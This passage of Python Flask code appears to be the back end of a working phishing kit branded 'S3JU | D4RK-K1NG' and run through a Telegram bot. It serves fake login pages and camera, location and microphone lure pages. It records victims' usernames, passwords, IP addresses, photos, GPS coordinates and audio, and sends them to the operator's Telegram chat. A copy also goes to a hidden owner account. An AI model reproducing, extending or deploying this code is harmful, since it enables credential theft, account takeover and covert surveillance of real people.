        conn.commit()
        conn.close()
        edit_message(chat_id, message_id,
            "⚠️ <b>Warn User</b>\n\nSend: <code>chat_id reason for warning</code>\n\nExample: <code>123456789 Stop spamming</code>")
        answer_callback(cb_id, "Send warning.")
        return

    if data == "admin_clear_all":
        keyboard = {
            "inline_keyboard": [
                [{"text": "🗑️ Yes, clear everything", "callback_data": "admin_confirm_clear"}],
                [{"text": "🔙 Back", "callback_data": "admin_dashboard"}]
            ]
        }
        edit_message(chat_id, message_id, "⚠️ <b>Are you sure?</b>\n\nThis will delete ALL captures and sessions permanently!", reply_markup=keyboard)
        answer_callback(cb_id, "Confirm?")
        return

    if data == "admin_confirm_clear":
        conn.execute("DELETE FROM captures")
        conn.execute("DELETE FROM sessions")
        conn.execute("UPDATE users SET total_captures = 0")
        conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'clear_all', 0, 'Cleared all data', ?)",
                     (chat_id, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        edit_message(chat_id, message_id, "🗑️ All captures and sessions have been cleared.", {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Data cleared.")
        return

    conn.close()
    answer_callback(cb_id, "Unknown option.")

@app.route("/p/<session_id>", methods=["GET"])
def serve_phishing_page(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session or session["status"] == "cancelled":
        conn.close()
        return "<html><body style='font-family:sans-serif;text-align:center;padding:40px'><h1>Page not found</h1><p>This link is invalid or expired.</p></body></html>", 404

    ip = get_visitor_ip()
    conn.execute("UPDATE sessions SET total_views = total_views + 1, ip = ? WHERE session_id = ?", (ip, session_id))
    conn.commit()
    conn.close()

    platform = session["platform"].lower()

    if platform == "camera":
        template = load_template("camera.html")
        if template:
            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("camera"))
        return redirect("https://www.instagram.com")

    if platform == "gps":
        template = load_template("location.html")
        if template:
            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("gps"))
        return redirect("https://maps.google.com")

    if platform == "mic":
        template = load_template("mic.html")
        if template:
            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))
        return redirect("https://www.instagram.com")

    template_file = PLATFORM_TEMPLATES.get(platform)
    if not template_file:
        return redirect("https://www.google.com")

    template = load_template(template_file)
    if template:
        return render_template_string(template, session_id=session_id)
    return redirect("https://www.google.com")

@app.route("/capture/<session_id>", methods=["POST"])
def capture_credentials(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session:
        conn.close()
        return redirect("https://www.google.com")

    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = get_visitor_ip()
    timestamp = datetime.now().isoformat()
    chat_id = session["chat_id"]
    platform = session["platform"]

    conn.execute(
        "INSERT INTO captures (session_id, chat_id, platform, username, password, ip, captured_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (session_id, chat_id, platform, username, password, ip, timestamp))
    conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
    conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
    conn.commit()
    conn.close()

    msg = (
        f"🔓 <b>CREDENTIALS CAPTURED!</b> 🔓\n\n"
        f"📱 <b>Platform:</b> {platform}\n"
        f"👤 <b>Username:</b> <code>{html.escape(username)}</code>\n"
        f"🔑 <b>Password:</b> <code>{html.escape(password)}</code>\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"⏰ <b>Time:</b> {timestamp}\n\n"
        f"🚀 S3JU | D4RK-K1NG"
    )

    send_telegram(chat_id, msg)

    if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
        send_telegram(int(OWNER_CHAT_ID), f"📋 <b>Backup Capture</b>\n\nSession: {session_id}\n{msg}")

    real_url = get_redirect_url(platform)
    template = load_template("redirect.html")
    if template:
        return render_template_string(template, redirect_url=real_url)
    return redirect(real_url)

@app.route("/capture_media/<session_id>", methods=["POST"])
def capture_media(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session:
        conn.close()
        return jsonify({"success": False, "error": "Invalid session"}), 404

    data = request.get_json(force=True, silent=True)
    if not data:
        conn.close()
        return jsonify({"success": False, "error": "No data"}), 400

    media_type = data.get("type", "")
    chat_id = session["chat_id"]
    platform = session["platform"]
    timestamp = datetime.now().isoformat()

    if media_type == "photo":
        image_data = data.get("data", "")
        if image_data:
            try:
                header, encoded = image_data.split(",", 1)
                img_bytes = base64.b64decode(encoded)
                caption = f"📸 <b>Photo Captured</b>\n\nPlatform: {platform}\nSession: {session_id}\nTime: {timestamp}\n\nS3JU | D4RK-K1NG"
                send_photo_telegram(chat_id, img_bytes, caption)
                if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
                    send_photo_telegram(int(OWNER_CHAT_ID), img_bytes, f"📋 <b>Backup Photo</b>\n\nSession: {session_id}\n{caption}")
                conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
                conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
                conn.commit()
            except Exception as e:
                logger.error(f"Photo decode error: {e}")

    elif media_type == "location":
        loc = data.get("data", {})
        lat = loc.get("latitude", 0)
        lon = loc.get("longitude", 0)
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        msg = (
            f"📍 <b>Location Captured</b> 📍\n\n"
            f"📱 <b>Platform:</b> {platform}\n"
            f"🌐 <b>Latitude:</b> {lat}\n"
            f"🌐 <b>Longitude:</b> {lon}\n"
            f"🗺️ <b>Maps:</b> <a href='{maps_link}'>View on Google Maps</a>\n"
            f"⏰ <b>Time:</b> {timestamp}\n\n"
            f"🚀 S3JU | D4RK-K1NG"
        )
        send_telegram(chat_id, msg)
        if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
            send_telegram(int(OWNER_CHAT_ID), f"📋 <b>Backup Location</b>\n\nSession: {session_id}\n{msg}")
        conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
        conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

    elif media_type == "audio":
        audio_data = data.get("data", "")
        if audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                caption = f"🎤 <b>Audio Captured</b>\n\nPlatform: {platform}\nSession: {session_id}\nTime: {timestamp}\n\nS3JU | D4RK-K1NG"
                send_document_telegram(chat_id, audio_bytes, f"audio_{session_id[:8]}.webm", caption)
                if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
                    send_document_telegram(int(OWNER_CHAT_ID), audio_bytes, f"audio_{session_id[:8]}.webm", f"📋 <b>Backup Audio</b>\n\nSession: {session_id}\n{caption}")
                conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
                conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
                conn.commit()
            except Exception as e:
                logger.error(f"Audio decode error: {e}")

    conn.close()
    return jsonify({"success": True})

init_db()

try:
    if PUBLIC_URL and PUBLIC_URL != "http://localhost:5000":
        webhook_url = f"{PUBLIC_URL}/webhook"
        logger.info(f"S3JU v1.0 - Setting webhook to: {webhook_url}")
        set_webhook(webhook_url)
    else:
        logger.warning("PUBLIC_URL not set. Webhook not configured. Set RAILWAY_URL or RENDER_EXTERNAL_URL.")
except Exception as e:
    logger.error(f"Failed to set webhook: {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"S3JU v1.0 starting on port {port}")
    app.run(host="0.0.0.0", port=port)
